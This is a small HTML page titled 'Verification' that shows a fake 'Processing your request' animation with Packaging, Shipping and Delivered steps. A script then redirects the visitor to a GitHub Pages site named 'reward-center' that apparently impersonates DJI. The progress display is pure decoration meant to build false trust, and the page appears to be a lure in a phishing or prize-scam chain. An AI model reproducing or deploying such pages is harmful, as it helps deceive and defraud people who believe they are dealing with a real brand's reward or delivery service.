<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verification</title>

<style>
body{
    margin:0;
    font-family:Arial, sans-serif;
    background:#0b0b0b;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

/* Container */
.box{
    text-align:center;
    width:90%;
    max-width:400px;
}

/* Title */
h2{
    margin-bottom:20px;
}

/* Progress Bar */
.progress{
    display:flex;
    justify-content:space-between;
    margin-top:30px;
    position:relative;
}

/* Line */
.progress::before{
    content:'';
    position:absolute;
    top:15px;
    left:0;
    width:100%;
    height:4px;
    background:#333;
    z-index:0;
}

/* Active Line */
.progress-line{
    position:absolute;
    top:15px;
    left:0;
    height:4px;
    background:#00ffcc;
    width:0%;
    z-index:1;
    transition:0.8s;
}

/* Step */
.step{
    position:relative;
    z-index:2;
    text-align:center;
    width:33%;
}

.circle{
    width:30px;
    height:30px;
    border-radius:50%;
    background:#333;
    margin:0 auto;
    line-height:30px;
    font-size:14px;
}

.active .circle{
    background:#00ffcc;
    color:#000;
}

/* Text */
.label{
    margin-top:8px;
    font-size:12px;
    color:#aaa;
}

.active .label{
    color:#00ffcc;
}
</style>

</head>

<body>

<div class="box">
    <h2>Processing your request...</h2>

    <div class="progress">
        <div class="progress-line" id="line"></div>

        <div class="step" id="step1">
            <div class="circle">1</div>
            <div class="label">Packaging</div>
        </div>

        <div class="step" id="step2">
            <div class="circle">2</div>
            <div class="label">Shipping</div>
        </div>

        <div class="step" id="step3">
            <div class="circle">3</div>
            <div class="label">Delivered</div>
        </div>
    </div>
</div>

<script>
let line = document.getElementById("line");

setTimeout(()=>{
    document.getElementById("step1").classList.add("active");
    line.style.width="33%";
},800);

setTimeout(()=>{
    document.getElementById("step2").classList.add("active");
    line.style.width="66%";
},1800);

setTimeout(()=>{
    document.getElementById("step3").classList.add("active");
    line.style.width="100%";
},2800);

setTimeout(()=>{
    window.location.href="https://reward-center.github.io/dji_official/";
},3500);
</script>

</body>
</html>
